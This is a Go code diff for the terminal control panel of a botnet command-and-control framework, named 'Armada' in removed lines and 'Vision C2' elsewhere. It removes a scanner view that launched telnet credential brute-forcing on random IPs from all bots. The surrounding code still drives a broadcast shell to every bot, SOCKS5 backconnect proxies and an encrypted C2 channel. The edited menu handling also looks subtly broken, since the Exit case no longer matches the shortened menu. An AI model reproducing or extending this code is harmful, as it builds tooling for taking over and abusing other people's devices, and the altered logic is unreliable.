@@ -132,7 +132,6 @@ const (
 	ViewHelp
 	ViewRemoteShell
 	ViewBroadcastShell
-	ViewScanners
 )
 
 // TUIModel is the main Bubble Tea model for the CNC interface
@@ -195,9 +194,6 @@ type TUIModel struct {
 	socksNewPort   string // Listen port for direct SOCKS5
 	socksNewUser   string // Optional proxy username
 	socksNewPass   string // Optional proxy password
-
-	// Scanner manager
-	scannerCursor int // 0=Telnet
 
 	// Quit flag
 	quitting bool
@@ -580,10 +576,6 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			if !m.socksInputMode && m.socksCursor > 0 {
 				m.socksCursor--
 			}
-		case ViewScanners:
-			if m.scannerCursor > 0 {
-				m.scannerCursor--
-			}
 		}
 
 	case "down", "j":
@@ -620,9 +612,6 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 					m.socksCursor++
 				}
 			}
-		case ViewScanners:
-			// Only one scanner now (Telnet)
-			_ = m.scannerCursor
 		}
 
 	case "left":
@@ -653,24 +642,6 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		return m.handleEnter()
 
 	case "s", "S":
-		// Start scanner on all bots (scanner view)
-		if m.currentView == ViewScanners {
-			scannerCmds := []string{"!scan"}
-			cmd := scannerCmds[m.scannerCursor]
-			if m.scannerCursor == 0 {
-				// Telnet scanner needs a scan server address — placeholder
-				cmd = "!scan 0.0.0.0:48101"
-			}
-			sentCount := sendToFilteredBots(cmd, "", 0, 0)
-			scannerNames := []string{"Telnet"}
-			neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
-			neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
-			m.toastMessage = neonGreen.Render("▶") + " " +
-				neonCyan.Render(scannerNames[m.scannerCursor]) + " " +
-				neonGreen.Render(fmt.Sprintf("started on %d bots", sentCount))
-			m.toastExpiry = time.Now().Add(3 * time.Second)
-			return m, nil
-		}
 		// Start direct SOCKS on selected bot with default port
 		if m.currentView == ViewSocks && !m.socksInputMode && len(m.bots) > 0 {
 			if m.socksCursor < len(m.bots) {
@@ -707,20 +678,6 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		}
 
 	case "x", "X":
-		// Stop scanner on all bots (scanner view)
-		if m.currentView == ViewScanners {
-			stopCmds := []string{"!stopscan"}
-			cmd := stopCmds[m.scannerCursor]
-			sentCount := sendToFilteredBots(cmd, "", 0, 0)
-			scannerNames := []string{"Telnet"}
-			neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
-			neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
-			m.toastMessage = neonRed.Render("■") + " " +
-				neonCyan.Render(scannerNames[m.scannerCursor]) + " " +
-				neonRed.Render(fmt.Sprintf("stopped on %d bots", sentCount))
-			m.toastExpiry = time.Now().Add(3 * time.Second)
-			return m, nil
-		}
 		// Stop socks on selected bot (in socks view)
 		if m.currentView == ViewSocks && !m.socksInputMode && m.socksCursor < len(m.bots) {
 			bot := m.bots[m.socksCursor]
@@ -767,9 +724,6 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		m.currentView = ViewSocks
 		m.refreshBotList()
 	case "4":
-		m.currentView = ViewScanners
-		m.refreshBotList()
-	case "5":
 		m.currentView = ViewHelp
 
 	case "r":
@@ -797,15 +751,12 @@ func (m TUIModel) handleEnter() (tea.Model, tea.Cmd) {
 			m.currentView = ViewSocks
 			m.socksInputMode = false
 			m.refreshBotList()
-		case 2: // Scanners
-			m.currentView = ViewScanners
-			m.refreshBotList()
-		case 3: // Broadcast Shell
+		case 2: // Broadcast Shell
 			m.currentView = ViewBroadcastShell
 			m.shellOutput = []string{}
 			m.shellInput = ""
 			m.selectedBot = ""
-		case 4: // Help
+		case 3: // Help
 			m.currentView = ViewHelp
 		case 5: // Exit
 			m.quitting = true
@@ -936,8 +887,6 @@ func (m TUIModel) View() string {
 		content = m.viewBotList()
 	case ViewSocks:
 		content = m.viewSocks()
-	case ViewScanners:
-		content = m.viewScanners()
 	case ViewHelp:
 		content = m.viewHelp()
 	case ViewRemoteShell:
@@ -1160,7 +1109,7 @@ func (m TUIModel) renderStatsBar() string {
 		dim.Render("·")+" "+cyan.Render(ramStr),
 		dim.Render("·")+" "+purple.Render(fmt.Sprintf("%d", m.totalCPU))+dim.Render(" cores"),
 		dim.Render("·")+" "+orange.Render(uptime),
-		dim.Render("·")+" "+green.Render("vpe2"))
+		dim.Render("·")+" "+green.Render("EZF3"))
 
 	return bar
 }
@@ -1497,73 +1446,6 @@ func (m TUIModel) viewSocks() string {
 	return b.String()
 }
 
-func (m TUIModel) viewScanners() string {
-	var b strings.Builder
-
-	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
-	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
-	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
-	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
-	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))
-	accent := lipgloss.NewStyle().Foreground(lipgloss.Color("105"))
-
-	b.WriteString(headerStyle.Render("  SCANNER MANAGEMENT"))
-	b.WriteString("\n")
-
-	b.WriteString(fmt.Sprintf("  %s %s\n\n",
-		dim.Render("Connected Bots:"), white.Render(fmt.Sprintf("%d", m.botCount))))
-
-	type scannerEntry struct {
-		name     string
-		desc     string
-		startCmd string
-		stopCmd  string
-	}
-
-	scanners := []scannerEntry{
-		{"Telnet Scanner", "Brute-force telnet credentials on random IPs", "!scan", "!stopscan"},
-	}
-
-	tableWidth := 64
-	b.WriteString(accent.Render("    ┌"+strings.Repeat("─", tableWidth)+"┐") + "\n")
-
-	for i, scanner := range scanners {
-		cursor := "    "
-		nameStyle := dim
-		if i == m.scannerCursor {
-			cursor = "  ▸ "
-			nameStyle = neonCyan.Bold(true)
-		}
-
-		nameLine := fmt.Sprintf("%s%s", cursor, nameStyle.Render(padRight(scanner.name, tableWidth-2)))
-		b.WriteString(accent.Render("    │") + nameLine + accent.Render("│") + "\n")
-
-		descLine := fmt.Sprintf("      %s", dim.Render(scanner.desc))
-		b.WriteString(accent.Render("    │") + padRight(descLine, tableWidth+2) + accent.Render("│") + "\n")
-
-		if i < len(scanners)-1 {
-			b.WriteString(accent.Render("    ├"+strings.Repeat("─", tableWidth)+"┤") + "\n")
-		}
-	}
-
-	b.WriteString(accent.Render("    └"+strings.Repeat("─", tableWidth)+"┘") + "\n")
-
-	b.WriteString("\n")
-	b.WriteString(dim.Render("  ────────────────────────────────────────────────────────────────"))
-	b.WriteString("\n")
-
-	hotkey := neonYellow
-	selected := scanners[m.scannerCursor].name
-	b.WriteString(fmt.Sprintf("  Selected: %s\n", neonCyan.Render(selected)))
-	b.WriteString(fmt.Sprintf("  %s Start on all bots   %s Stop on all bots   %s Back\n",
-		hotkey.Render("[s]"),
-		hotkey.Render("[x]"),
-		hotkey.Render("[esc]")))
-	_ = neonGreen
-
-	return b.String()
-}
-
 func (m TUIModel) viewRemoteShell() string {
 	var b strings.Builder
 
@@ -1765,7 +1647,7 @@ func (m TUIModel) viewHelp() string {
 	b.WriteString("\n\n")
 
 	// Section tabs with page indicator
-	sections := []string{"Start", "Keys", "Bots", "Shell", "SOCKS", "Network", "FAQ", "About"}
+	sections := []string{"Start", "Keys", "Bots", "Shell", "SOCKS", "Net", "FAQ", "About"}
 	for i, sec := range sections {
 		if i == m.helpSection {
 			b.WriteString(neonCyan.Bold(true).Render(" [" + sec + "] "))
@@ -1785,7 +1667,7 @@ func (m TUIModel) viewHelp() string {
 		b.WriteString("\n\n")
 
 		b.WriteString(neonOrange.Render("  Overview") + "\n")
-		b.WriteString(white.Render("  Armada is a command & control framework with a full") + "\n")
+		b.WriteString(white.Render("  Vision is a command & control framework with a full") + "\n")
 		b.WriteString(white.Render("  terminal UI. Navigate with arrow keys and hotkeys.") + "\n\n")
 
 		b.WriteString(neonOrange.Render("  Getting Started") + "\n")
@@ -1806,7 +1688,6 @@ func (m TUIModel) viewHelp() string {
 		menuItems := []struct{ item, desc string }{
 			{"BOT MANAGEMENT", "View and manage connected bots"},
 			{"SOCKS MANAGER", "SOCKS5 backconnect proxy"},
-			{"SCANNERS", "Start/stop exploit scanners (Telnet)"},
 			{"BROADCAST SHELL", "Send commands to all bots"},
 			{"HELP & INFO", "This documentation (you are here)"},
 		}
@@ -1958,48 +1839,13 @@ func (m TUIModel) viewHelp() string {
 		b.WriteString(white.Render("  proxychains4 nmap -sT target.com") + "\n")
 		b.WriteString(dim.Render("  Relay endpoints can be pre-configured in setup.py") + "\n")
 
-	case 5: // Scanners
-		b.WriteString(neonPurple.Bold(true).Render("  📡 SCANNER MANAGEMENT"))
-		b.WriteString("\n\n")
-
-		b.WriteString(neonOrange.Render("  Overview") + "\n")
-		b.WriteString(white.Render("  Scanners run on bots to find and exploit vulnerable devices.") + "\n")
-		b.WriteString(white.Render("  Use the Scanners menu (key 4) to start/stop them on all bots.") + "\n\n")
-
-		b.WriteString(neonOrange.Render("  Available Scanners") + "\n")
-		scannerInfo := []struct{ name, desc string }{
-			{"Telnet", "Brute-forces telnet credentials on random IPs (port 23)"},
-		}
-		for _, s := range scannerInfo {
-			b.WriteString(fmt.Sprintf("  %s %s\n",
-				neonCyan.Render(fmt.Sprintf("%-12s", s.name)),
-				white.Render(s.desc)))
-		}
-
-		b.WriteString("\n" + neonOrange.Render("  Controls") + "\n")
-		scanKeys := []struct{ key, desc string }{
-			{"↑ / ↓", "Select scanner"},
-			{"s", "Start selected scanner on all bots"},
-			{"x", "Stop selected scanner on all bots"},
-			{"esc / q", "Back to main menu"},
-		}
-		for _, k := range scanKeys {
-			b.WriteString(fmt.Sprintf("  %s %s\n",
-				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
-				white.Render(k.desc)))
-		}
-
-		b.WriteString("\n" + neonOrange.Render("  Shell Commands") + "\n")
-		b.WriteString(fmt.Sprintf("  %s %s\n", neonCyan.Render("!scan <host:port>"), dim.Render("Start telnet scanner reporting to scan server")))
-		b.WriteString(fmt.Sprintf("  %s %s\n", neonCyan.Render("!stopscan        "), dim.Render("Stop telnet scanner")))
-
-	case 6: // Network & Security
+	case 5: // Network & Security
 		b.WriteString(neonOrange.Bold(true).Render("  🔒 NETWORK & SECURITY"))
 		b.WriteString("\n\n")
 
 		b.WriteString(neonOrange.Render("  Communication") + "\n")
 		netInfo := []struct{ item, desc string }{
-			{"Protocol", "VPE2 encrypted channel (ChaCha20 + X25519 + HMAC, port 443)"},
+			{"Protocol", "EZF3 encrypted channel (ChaCha20 + X25519 + HMAC, port 443)"},
 			{"Auth", "HMAC-SHA256 challenge-response with forward secrecy"},
 			{"C2 Resolve", "DoH TXT → DNS TXT → A record → direct IP"},
 			{"Encryption", "ChaCha20 + HMAC-SHA256 authenticated framing"},
@@ -2042,14 +1888,14 @@ func (m TUIModel) viewHelp() string {
 		b.WriteString(white.Render("  amd64, 386, arm, arm64, mips, mipsle, mips64,") + "\n")
 		b.WriteString(white.Render("  mips64le, ppc64, ppc64le, riscv64, s390x, loong64") + "\n")
 
-	case 7: // Troubleshooting
+	case 6: // Troubleshooting
 		b.WriteString(neonYellow.Bold(true).Render("  🔧 TROUBLESHOOTING"))
 		b.WriteString("\n\n")
 
 		b.WriteString(neonOrange.Render("  Bots Not Connecting") + "\n")
 		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Check firewall: ufw allow 443/tcp")))
 		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Verify C2 address in setup_config.txt")))
-		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Test VPE2: nc -zv IP 443")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Test EZF3: nc -zv IP 443")))
 		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Ensure protocol version matches (bot & server)")))
 
 		b.WriteString("\n" + neonOrange.Render("  Port 443 Permission Denied") + "\n")
@@ -2064,13 +1910,13 @@ func (m TUIModel) viewHelp() string {
 		b.WriteString("\n" + neonOrange.Render("  Build Errors") + "\n")
 		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Go not found: export PATH=$PATH:/usr/local/go/bin")))
 		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("m30w packer missing: ensure tools/upx exists")))
-		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("ARM/RISC-V error: update to latest Armada")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("ARM/RISC-V error: update to latest build")))
 
 		b.WriteString("\n" + neonOrange.Render("  Dead Bots") + "\n")
 		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Bots auto-cleaned after 5 min timeout")))
 		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Press r in Bot List to force refresh")))
 
-	case 8: // About
+	case 7: // About
 		b.WriteString(neonPink.Bold(true).Render("  👁️  ABOUT VISION C2"))
 		b.WriteString("\n\n")
 
@@ -2212,7 +2058,6 @@ func NewTUIModel() TUIModel {
 		menuItems: []string{
 			"BOT MANAGEMENT",
 			"SOCKS MANAGER",
-			"SCANNERS",
 			"BROADCAST SHELL",
 			"HELP & INFO",
 			"EXIT",
